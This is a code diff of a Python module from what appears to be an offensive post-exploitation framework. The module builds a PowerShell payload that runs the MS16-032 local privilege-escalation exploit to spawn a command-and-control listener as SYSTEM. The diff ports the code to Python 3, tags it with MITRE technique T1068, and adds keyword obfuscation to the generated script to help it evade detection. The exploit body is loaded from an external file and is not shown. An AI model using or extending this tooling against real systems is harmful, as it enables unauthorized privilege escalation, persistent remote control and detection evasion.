@@ -1,6 +1,12 @@
+from __future__ import print_function
+
+from builtins import object
+from builtins import str
+
 from lib.common import helpers
 
-class Module:
+
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -12,6 +18,11 @@ class Module:
             'Description': ('Spawns a new Listener as SYSTEM by'
                             ' leveraging the MS16-032 local exploit.'
                             ' Note: ~1/6 times the exploit won\'t work, may need to retry.'),
+
+            'Software': '',
+
+            'Techniques': ['T1068'],
+
             'Background' : True,
 
             'OutputExtension' : None,
@@ -78,7 +89,7 @@ class Module:
         try:
             f = open(moduleSource, 'r')
         except:
-            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
+            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
             return ""
 
         moduleCode = f.read()
@@ -100,7 +111,11 @@ class Module:
         
         scriptEnd = 'Invoke-MS16032 -Command "' + launcherCode + '"'
         scriptEnd += ';`nInvoke-MS16032 completed.'
+
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
+        script = helpers.keyword_obfuscation(script)
+
         return script
+
